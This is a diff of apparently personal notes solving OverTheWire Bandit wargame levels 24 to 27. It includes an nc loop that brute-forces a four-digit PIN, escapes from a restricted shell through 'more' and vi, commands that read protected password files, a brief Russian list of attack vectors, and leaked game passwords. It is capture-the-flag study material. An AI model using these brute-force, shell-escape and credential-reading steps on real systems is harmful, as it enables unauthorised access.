@@ -68,3 +68,43 @@ for p in $(seq -f "%04g" 1 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $p; d
 
 bandit24@bandit:~$ for p in $(seq -f "%04g" 1 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $p; done | nc -v localhost 30002
 The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+ssh -i bandit26.sshkey bandit26@localhost
+
+векторы атаки
+изменить /etc/passwd
+изменить /usr/bin/showtext
+выполнить команду с помощью ssh
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+
+$ vi ~/.bashrc
+alias l='ls -lrt'
+export l
+
+Defining command alias temporarily on command line
+alias more='more -d' & export more &    
+
+ssh -i bandit26.sshkey bandit26@localhost alias more='more -d' & export more
+
+scp -i -i bandit26.sshkey .profile bandit26@localhost:~/.profile 
+
+scp -i bandit26.sshkey .profile bandit26@localhost:~/.profile
+
+
+ssh -o SendEnv=LC_MYVAR server.example.com 'MYVAR=$LC_MYVAR; unset LC_MYVAR; export MYVAR; mycommand'
+
+export LC_MORE=-1
+ssh -t -o SendEnv=LC_MORE -v -i bandit26.sshkey bandit26@localhost 'MORE=$LC_MORE; unset LC_MORE; export MORE'
+https://superuser.com/questions/163167/when-sshing-how-can-i-set-an-environment-variable-on-the-server-that-changes-f
+
+env TERM="extra information:$TERM" ssh -t server.example.com 'MYVAR=${TERM%:*}; TERM=${TERM##*:}; export MYVAR; mycommand'
+env TERM="-1:$TERM" ssh -t -v -i bandit26.sshkey bandit26@localhost 'MORE=${TERM%:*}; TERM=${TERM##*:}; export MORE'
+
+ssh -t -i bandit26.sshkey bandit26@localhost < /dev/tty
+stty rows 4; v; :r /etc/bandit_pass/bandit26
+The password of user bandit26 is 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+
+set shell=/bin/bash
+:r !ls
+:r !./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
